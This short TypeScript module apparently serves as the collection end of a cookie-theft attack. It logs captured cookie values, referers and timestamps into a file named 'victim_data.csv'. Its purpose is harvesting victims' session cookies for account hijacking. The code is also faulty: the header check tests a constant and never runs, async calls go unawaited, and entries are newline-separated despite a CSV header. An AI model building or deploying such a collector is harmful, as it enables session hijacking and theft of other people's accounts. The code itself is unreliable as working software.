import * as fs from 'node:fs/promises';

const file = "victim_data.csv"


async function checkFile(): Promise<void>{
    if(!file){
     await fs.writeFile(file, 'Cookie,Referer,Momentaner Zeitpunkt\n')
     return;
    }
    return;
}

export default function logCookie(cookieValue: string, referer: string): void {
    checkFile()
    const timestamp = new Date().toUTCString();
    const logEntry = `${cookieValue}\n${referer}\n${timestamp}\n`;
    fs.appendFile(file, logEntry);
}